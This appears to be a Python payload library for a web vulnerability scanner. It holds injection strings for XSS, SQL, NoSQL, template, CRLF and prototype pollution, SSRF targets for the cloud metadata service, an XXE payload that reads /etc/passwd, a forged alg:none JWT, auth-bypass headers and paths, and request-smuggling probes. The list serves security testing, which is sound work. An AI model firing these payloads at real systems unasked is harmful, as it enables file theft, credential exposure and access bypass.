"""Web vulnerability probe payload library."""
from __future__ import annotations

XSS_PAYLOADS = [
    "<script>window.__swift_xss=1</script>",
    "\"><svg/onload=window.__swift_xss=1>",
    "'\"><img src=x onerror=window.__swift_xss=1>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' AND SLEEP(2)-- -",
    "\" OR 1=1-- -",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:80/",
    "http://169.254.169.254/latest/meta-data/",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.example.com",
    "https://evil.example.com",
]

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "psycopg2.errors",
    "sqlite3.operationalerror",
    "ora-00933",
]

# ── SSTI ──────────────────────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    "{{7*7}}",       # Jinja2 / Twig
    "<%=7*7%>",      # ERB (Ruby)
    "{{7*'7'}}",     # Twig (returns "7777777")
]

SSTI_SIGNATURES = ["49", "7777777"]

# ── JWT ───────────────────────────────────────────────────────────────────────
# alg_none attack: replace signature with empty string
JWT_ATTACKS = {
    "alg_none": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
}
JWT_WEAK_SECRETS = ["secret", "password", "123456", "jwt_secret", ""]

# ── IDOR ──────────────────────────────────────────────────────────────────────
def idor_probes(id_value: str) -> list[str]:
    """Return sequential ID variants to probe IDOR for a given id value."""
    try:
        n = int(id_value)
        return [str(n + 1), str(max(0, n - 1))]
    except (ValueError, TypeError):
        return []

IDOR_PROBES = idor_probes  # callable alias

# ── Auth Bypass ───────────────────────────────────────────────────────────────
AUTH_BYPASS_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Original-URL": "/admin",
    "X-Rewrite-URL": "/admin",
}

AUTH_BYPASS_PATHS = [
    "..;/admin",
    "/%2e%2e/admin",
    "/admin%20",
    "/.admin",
]

# ── NoSQL Injection ───────────────────────────────────────────────────────────
NOSQL_PAYLOADS = [
    '{"$gt":""}',
    '{"$ne":null}',
    "[$ne]=1",
]

# ── Prototype Pollution ───────────────────────────────────────────────────────
PROTOTYPE_POLLUTION_PAYLOADS = [
    "__proto__[admin]=true",
    "constructor.prototype.admin=true",
    "__proto__[isAdmin]=1",
]

# ── CRLF Injection ────────────────────────────────────────────────────────────
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:swift_crlf=1",
    "%0d%0aLocation:http://evil.example",
]

# ── XXE ───────────────────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    # File read via XXE
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<foo>&xxe;</foo>"
    ),
    # SSRF via XXE (AWS IMDS)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>'
        "<foo>&xxe;</foo>"
    ),
]

# ── HTTP Request Smuggling ────────────────────────────────────────────────────
# NOTE: These are payload descriptors only. Actual smuggling requires raw
# socket access — Playwright cannot be used for this. Implementation deferred.
SMUGGLING_PROBES = [
    # CL.TE variant: front-end uses Content-Length, back-end uses Transfer-Encoding
    {
        "method": "POST",
        "cl": 6,
        "te": "chunked",
        "body": "0\r\n\r\nG",
    },
    # TE.CL variant: front-end uses Transfer-Encoding, back-end uses Content-Length
    {
        "method": "POST",
        "cl": 3,
        "te": "chunked",
        "body": "1\r\nG\r\n0\r\n\r\n",
    },
]
